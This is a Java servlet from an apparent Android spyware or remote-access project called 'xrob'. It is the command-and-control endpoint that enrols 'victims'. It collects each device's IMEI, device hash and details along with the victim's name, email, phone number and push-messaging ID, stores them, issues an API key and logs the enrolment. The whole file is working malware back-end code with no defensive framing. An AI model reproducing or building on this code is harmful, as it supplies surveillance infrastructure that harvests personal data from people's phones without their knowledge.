package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.database.tables.Victims;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.models.Victim;
import com.theah64.xrob.api.utils.APIResponse;
import com.theah64.xrob.api.utils.RandomString;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * Used to create new victim
 * Needed params
 * 1) Name
 * 2) Imei
 * 3) FCM ID - Optional
 */
@WebServlet(name = "IN Servlet", urlPatterns = {AdvancedBaseServlet.VERSION_CODE + "/in"})
public class INServlet extends AdvancedBaseServlet {

    private static final int API_KEY_LENGTH = 10;

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }


    @Override
    protected boolean isSecureServlet() {
        return false;
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[]{
                Victims.COLUMN_IMEI,
                Victims.COLUMN_DEVICE_NAME,
                Victims.COLUMN_DEVICE_HASH,
                Victims.COLUMN_OTHER_DEVICE_INFO
        };
    }

    @Override
    protected void doAdvancedPost() throws Exception {

        final String imei = getStringParameter(Victims.COLUMN_IMEI);
        final String deviceName = getStringParameter(Victims.COLUMN_DEVICE_NAME);
        final String deviceHash = getStringParameter(Victims.COLUMN_DEVICE_HASH);
        final String otherDeviceInfo = getStringParameter(Victims.COLUMN_OTHER_DEVICE_INFO);

        final Victims victimsTable = Victims.getInstance();
        final Victim oldVictim = victimsTable.get(Victims.COLUMN_DEVICE_HASH, deviceHash);

        final String apiKey;

        //Victim's details
        final String name = getStringParameter(Victims.COLUMN_NAME);
        final String email = getStringParameter(Victims.COLUMN_EMAIL);
        final String phone = getStringParameter(Victims.COLUMN_PHONE);

        //FCM ID may be null
        String fcmId = getStringParameter(Victims.COLUMN_FCM_ID);

        if (fcmId != null && fcmId.isEmpty()) {
            fcmId = null;
        }

        if (oldVictim == null) {

            //Preparing new api key for new victim
            apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);

            final Victim newVictim = new Victim(null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, otherDeviceInfo, null, null, true,
                    RandomString.getRandomString(Victim.VICTIM_CODE_LENGTH)
            );

            final String victimId = victimsTable.addv3(newVictim);

            Deliveries.getInstance().add(new Delivery(victimId, false, "join", Delivery.TYPE_JOIN, 0));

        } else {

            //Setting new values to old victim.
            if (isUpdateFeasible(oldVictim.getFCMId(), fcmId)) {
                victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_FCM_ID, fcmId);
            }

            if (isUpdateFeasible(oldVictim.getName(), name)) {
                victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_NAME, name);
            }

            if (isUpdateFeasible(oldVictim.getEmail(), email)) {
                victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_EMAIL, email);
            }

            if (isUpdateFeasible(oldVictim.getPhone(), phone)) {
                victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_PHONE, phone);
            }


            //Old victim!
            apiKey = oldVictim.getApiKey();

            Deliveries.getInstance().add(new Delivery(oldVictim.getId(), false, "re_join", Delivery.TYPE_RE_JOIN, 0));
        }


        //Finally
        getWriter().write(new APIResponse("success", Victims.COLUMN_API_KEY, apiKey).getResponse());
    }

    private static boolean isUpdateFeasible(final String oldValue, String newValue) {
        return (newValue != null && !newValue.isEmpty() && ((oldValue != null && !oldValue.equals(newValue)) || oldValue == null));
    }

    //GET METHOD NOT SUPPORTED ###
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        setGETMethodNotSupported(response);
    }


}
